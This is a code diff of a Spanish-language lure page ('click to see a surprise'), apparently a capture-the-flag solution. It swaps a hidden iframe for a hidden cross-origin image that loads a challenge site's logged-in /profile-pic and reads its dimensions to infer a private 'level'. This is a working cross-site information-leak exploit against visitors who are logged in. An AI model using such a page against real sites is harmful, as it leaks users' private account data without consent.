@@ -5,29 +5,30 @@
 </head>
 <body>
     <h1>Haz clic para ver una sorpresa</h1>
-    <h1>cargo nuevo 2</h1>
+    <h1>cargo nuevo 3</h1>
     <div id="resultado"></div>
-    <iframe id="profileFrame" src="https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar/" style="display:none;"></iframe>
+    <img id="profilePic" style="display:none;" alt="Profile Picture" crossorigin="anonymous">
     <script>
-        const iframe = document.getElementById('profileFrame');
-        iframe.onload = () => {
-            try {
-                const img = iframe.contentDocument.querySelector('img[src="/profile-pic"]');
-                if (img) {
-                    const width = img.naturalWidth;
-                    const height = img.naturalHeight;
-                    const level = width * height;
-                    document.getElementById('resultado').innerHTML = `
-                        <p>Ancho: ${width}px</p>
-                        <p>Alto: ${height}px</p>
-                        <p>Nivel de Pepe: ${level}</p>
-                    `;
-                } else {
-                    document.getElementById('resultado').innerHTML = '<p>No se encontró la imagen en la página de perfil.</p>';
-                }
-            } catch (e) {
-                document.getElementById('resultado').innerHTML = `<p>Error: ${e.message}</p>`;
-            }
+        const img = document.getElementById('profilePic');
+        img.src = 'https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar/profile-pic';
+
+        img.onload = () => {
+            const width = img.naturalWidth;
+            const height = img.naturalHeight;
+            const level = width * height;
+            document.getElementById('resultado').innerHTML = `
+                <p>Ancho: ${width}px</p>
+                <p>Alto: ${height}px</p>
+                <p>Nivel de Pepe: ${level}</p>
+            `;
+            // Log success for debugging
+            console.log('Imagen cargada correctamente:', { width, height, level });
+        };
+
+        img.onerror = (error) => {
+            document.getElementById('resultado').innerHTML = `<p>Error al cargar la imagen: ${error.message || 'No se pudo acceder a la imagen. Verifica que estás logueado en Imagen Importante.'}</p>`;
+            // Log error for debugging
+            console.error('Error al cargar la imagen:', error);
         };
     </script>
 </body>
